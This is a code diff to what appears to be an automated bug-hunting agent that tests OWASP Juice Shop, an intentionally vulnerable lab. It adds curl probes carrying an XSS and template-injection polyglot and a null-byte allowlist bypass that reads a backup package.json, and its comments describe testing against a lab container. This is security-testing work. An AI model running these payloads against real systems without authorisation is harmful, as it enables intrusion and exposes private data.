@@ -915,13 +915,15 @@ async function agentIteration(huntId, target, recon, findings, iteration, playbo
     const diversityTests = [];
 
     // 1. XSS on search endpoints — search is the classic reflected-XSS sink.
+    // Also carries an SSTI polyglot ({{7*7}}): if the backend renders the
+    // query through a template engine, the response contains "49".
     const searchEp = eps.find((e) => /search/i.test(e) && /^\/(api|rest)/.test(e));
     if (searchEp && !plansMention(/xss|cross.?site|<script/i)) {
       diversityTests.push({
-        test: 'Reflected XSS on search',
-        command: `curl -sk "${baseUrl}${searchEp}?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E" | head -c 2000`,
-        why: 'Search endpoints often reflect input unsanitised — classic reflected XSS',
-        hypothesis: 'Search query parameter may reflect without encoding',
+        test: 'Reflected XSS + SSTI polyglot on search',
+        command: `curl -sk "${baseUrl}${searchEp}?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E%7B%7B7*7%7D%7D" | head -c 2000`,
+        why: 'Search endpoints often reflect input unsanitised — classic reflected XSS; the {{7*7}} polyglot also flags server-side template injection if the response contains 49',
+        hypothesis: 'Search query parameter may reflect without encoding or pass through a template engine',
       });
     }
 
@@ -947,6 +949,32 @@ async function agentIteration(huntId, target, recon, findings, iteration, playbo
         command: `curl -sk "${baseUrl}${basketEp}/99999" | head -c 2000`,
         why: 'Basket IDs are often sequential — testing if another basket is accessible',
         hypothesis: 'Basket endpoint may lack object-level authorisation',
+      });
+    }
+
+    // 4. LFI / backup-file disclosure via /ftp — Juice Shop (the lab target)
+    // intentionally ships an /ftp directory listing plus backup files; the
+    // null-byte ".bak%00.md" trick bypasses the .md allowlist and returns
+    // package.json. Grounded 19 Oct 2026 (solver #124) with safe read-only
+    // GETs against the live lab container: /ftp/ listing 200, the .bak%00.md
+    // URL returns the real package.json. READ-ONLY probe; no exfil beyond the
+    // HTTP response, and the assessResult pipeline (validators untouched)
+    // decides whether it counts as a finding.
+    // NOTE (19 Oct 2026, solver #124) — candidate classes deliberately NOT
+    // added because their vectors are absent on this lab version (v17.3.0),
+    // verified empirically: XXE (the B2B /file-upload path returns 410
+    // "deprecated for security reasons"; the echo does not resolve entities),
+    // open redirect (/redirect?to= returns 406), password-reset poisoning
+    // (/rest/user/security-question returns {} for unregistered emails — no
+    // registered test account in scope), SSRF/Gravatar (needs an authed
+    // session the driver does not hold), RCE (no grounded vector in this lab).
+    // Revisit only if recon discovers new endpoints.
+    if (!plansMention(/\/ftp|lfi|path.?traversal|directory.?list|backup.?file/i)) {
+      diversityTests.push({
+        test: 'FTP directory listing + backup file disclosure',
+        command: `{ echo '--- /ftp/ listing ---'; curl -sk "${baseUrl}/ftp/" | head -c 600; echo; echo '--- backup file via null-byte ---'; curl -sk "${baseUrl}/ftp/package.json.bak%00.md" | head -c 2000; }`,
+        why: 'Juice Shop ships an /ftp directory listing and backup files; the null-byte trick defeats the .md allowlist — both verified live against this lab container',
+        hypothesis: '/ftp may expose directory listing and backup files readable without authentication',
       });
     }
 
